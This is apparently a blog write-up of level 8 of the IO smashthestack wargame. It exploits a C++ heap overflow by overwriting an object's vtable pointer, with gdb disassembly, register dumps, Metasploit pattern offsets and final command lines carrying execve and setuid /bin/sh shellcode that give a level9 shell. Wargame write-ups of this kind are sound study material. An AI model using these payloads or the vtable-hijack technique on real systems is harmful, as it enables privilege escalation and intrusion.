+++
title = "IO Smash the stack level 08"
date = "2016-02-05T21:01:00-02:00"
publishdate = "2016-02-05"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-08"
project_url = "https://greyhat.dk/io-smashthestack-level-08"
type = "post"
+++

## Level08

```sh
level8@io:/levels$ ls -latr level08*
-r-sr-x--- 1 level9 level8 14343 Sep 17  2010 level08_alt
-r-------- 1 level8 level8  1927 Jan  3  2012 level08_alt.cpp
-r-sr-x--- 1 level9 level8  6662 Jan 26  2012 level08
-r-------- 1 level8 level8   666 May 27  2014 level08.cpp
```

```c
// writen by bla for io.smashthestack.org
#include <iostream>
#include <cstring>
#include <unistd.h>

class Number
{
        public:
                Number(int x) : number(x) {}
                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
                virtual int operator+(Number &r) {return number + r.number;}
        private:
                char annotation[100];
                int number;
};


int main(int argc, char **argv)
{
        if(argc < 2) _exit(1);

        Number *x = new Number(5);
        Number *y = new Number(6);
        Number &five = *x, &six = *y;

        five.setAnnotation(argv[1]);

        return six + five;
}
```

I actually tried to do a heap overflow but couldn't really understand why I had issues getting the return address overwritten. So I found an article about [C++ VPTRs](http://phrack.org/issues/56/8.html#article). So its a matter of overwriting the virtual function (operator+)

```sh
level8@io:/levels$ gdb -q ./level08
Reading symbols from /levels/level08...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048694 <+0>:	push   %ebp
   0x08048695 <+1>:	mov    %esp,%ebp
   0x08048697 <+3>:	and    $0xfffffff0,%esp
   0x0804869a <+6>:	push   %ebx
   0x0804869b <+7>:	sub    $0x2c,%esp
   0x0804869e <+10>:	cmpl   $0x1,0x8(%ebp)
   0x080486a2 <+14>:	jg     0x80486b0 <main+28>
   0x080486a4 <+16>:	movl   $0x1,(%esp)
   0x080486ab <+23>:	call   0x804857c <_exit@plt>
   0x080486b0 <+28>:	movl   $0x6c,(%esp)
   0x080486b7 <+35>:	call   0x80485bc <_Znwj@plt>
   0x080486bc <+40>:	mov    %eax,%ebx
   0x080486be <+42>:	mov    %ebx,%eax
   0x080486c0 <+44>:	movl   $0x5,0x4(%esp)
   0x080486c8 <+52>:	mov    %eax,(%esp)
   0x080486cb <+55>:	call   0x804879e <_ZN6NumberC1Ei>
   0x080486d0 <+60>:	mov    %ebx,0x10(%esp)
   0x080486d4 <+64>:	movl   $0x6c,(%esp)
   0x080486db <+71>:	call   0x80485bc <_Znwj@plt>
   0x080486e0 <+76>:	mov    %eax,%ebx
   0x080486e2 <+78>:	mov    %ebx,%eax
   0x080486e4 <+80>:	movl   $0x6,0x4(%esp)
   0x080486ec <+88>:	mov    %eax,(%esp)
   0x080486ef <+91>:	call   0x804879e <_ZN6NumberC1Ei>
   0x080486f4 <+96>:	mov    %ebx,0x14(%esp)
   0x080486f8 <+100>:	mov    0x10(%esp),%eax
   0x080486fc <+104>:	mov    %eax,0x18(%esp)
   0x08048700 <+108>:	mov    0x14(%esp),%eax
   0x08048704 <+112>:	mov    %eax,0x1c(%esp)
   0x08048708 <+116>:	mov    0xc(%ebp),%eax
   0x0804870b <+119>:	add    $0x4,%eax
   0x0804870e <+122>:	mov    (%eax),%eax
   0x08048710 <+124>:	mov    %eax,0x4(%esp)
   0x08048714 <+128>:	mov    0x18(%esp),%eax
   0x08048718 <+132>:	mov    %eax,(%esp)
   0x0804871b <+135>:	call   0x80487b6 <_ZN6Number13setAnnotationEPc>
   0x08048720 <+140>:	mov    0x1c(%esp),%eax
   0x08048724 <+144>:	mov    (%eax),%eax
   0x08048726 <+146>:	mov    (%eax),%edx
   0x08048728 <+148>:	mov    0x18(%esp),%eax
   0x0804872c <+152>:	mov    %eax,0x4(%esp)
   0x08048730 <+156>:	mov    0x1c(%esp),%eax
   0x08048734 <+160>:	mov    %eax,(%esp)
   0x08048737 <+163>:	call   *%edx
   0x08048739 <+165>:	add    $0x2c,%esp
   0x0804873c <+168>:	pop    %ebx
   0x0804873d <+169>:	mov    %ebp,%esp
   0x0804873f <+171>:	pop    %ebp
   0x08048740 <+172>:	ret
End of assembler dump.
```

The line
```sh
   0x08048737 <+163>:	call   *%edx
```

is actually the call to the operator+. Using the pattern_create.rb from metasploit to create a pattern.

```sh
kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

So lets try to make it crash

```sh
(gdb) r $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
Starting program: /levels/level08 $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')

Program received signal SIGSEGV, Segmentation fault.
0x08048726 in main ()
(gdb) i r
eax            0x41366441	1094083649
ecx            0x0	0
edx            0x0	0
ebx            0x804a078	134520952
esp            0xbffffbd0	0xbffffbd0
ebp            0xbffffc08	0xbffffc08
esi            0x0	0
edi            0x0	0
eip            0x8048726	0x8048726 <main+146>
eflags         0x10202	[ IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

So it crashes but we do not get to overwrite EIP .. but EAX looks interesting ( 0x41366441 = A6dA ). Lets see how many bytes we have

```sh
kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 0x41366441
[*] Exact match at offset 108
```

Lets test it

```sh
(gdb) r $(python -c 'print "A" * 108 + "CCCC"')
Starting program: /levels/level08 $(python -c 'print "A" * 108 + "CCCC"')

Program received signal SIGSEGV, Segmentation fault.
0x08048726 in main ()
(gdb) i r
eax            0x43434343	1128481603
ecx            0x0	0
edx            0x0	0
ebx            0x804a078	134520952
esp            0xbffffc20	0xbffffc20
ebp            0xbffffc58	0xbffffc58
esi            0x0	0
edi            0x0	0
eip            0x8048726	0x8048726 <main+146>
eflags         0x10202	[ IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/10x 0x804a078
0x804a078:	0x43434343	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000
(gdb) x/10x 0x804a078-112
0x804a008:	0x080488c8	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141
(gdb)
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a050:	0x41414141	0x41414141
(gdb)
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a078:	0x43434343	0x00000000
(gdb) disassemble 0x080488c8
Dump of assembler code for function _ZTV6Number:
   0x080488c0 <+0>:	add    %al,(%eax)
   0x080488c2 <+2>:	add    %al,(%eax)
   0x080488c4 <+4>:	aam    $0x88
   0x080488c6 <+6>:	add    $0x8,%al
   0x080488c8 <+8>:	loop   0x8048851 <__libc_csu_init+65>
   0x080488ca <+10>:	add    $0x8,%al
End of assembler dump.
```

Nice .. so we have the operator+ at 0x804a008 and then our buffer. So lets see if we can point it to our A's to control EIP

```sh
(gdb) !echo "obase=16;ibase=16;804A008+4"|bc
804A00C
(gdb) r $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level08 $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i r
eax            0x804a078	134520952
ecx            0x0	0
edx            0x41414141	1094795585
ebx            0x804a078	134520952
esp            0xbffffc1c	0xbffffc1c
ebp            0xbffffc58	0xbffffc58
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x10202	[ IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) r $(python -c 'print "CCCC" + "A" * 104 + "\x0c\xa0\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level08 $(python -c 'print "CCCC" + "A" * 104 + "\x0c\xa0\x04\x08"')

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb)
```

So now we are in control of EIP :)

```sh
level8@io:/levels$ export EGG=$(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
level8@io:/levels$ /tmp/desdic1/getenv EGG /levels/level08
EGG will be at 0xbffffeca
level8@io:/levels$ /levels/level08 $(python -c 'print "\xca\xfe\xff\xbf" + "A" * 104 + "\x0c\xa0\x04\x08"')
bash-4.2$ whoami
level8
```

hmm got a shell but I'm still level8 so .. lets try to use the shellcode from [Aleph One](http://insecure.org/stf/smashstack.html)

oki .. after a couble of tries I figured out that I need to take account for the dereference for the v-table. So to account for this we can point 4 bytes deeper within our buffer.

```sh
level8@io:/levels$ echo "obase=16;ibase=16;804A00C+4"|bc
804A010
level8@io:~$ /levels/level08 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"A"*51 + "\x0c\xa0\x04\x08"')
sh-4.2$ whoami
level9
```

"Fun And Profit"
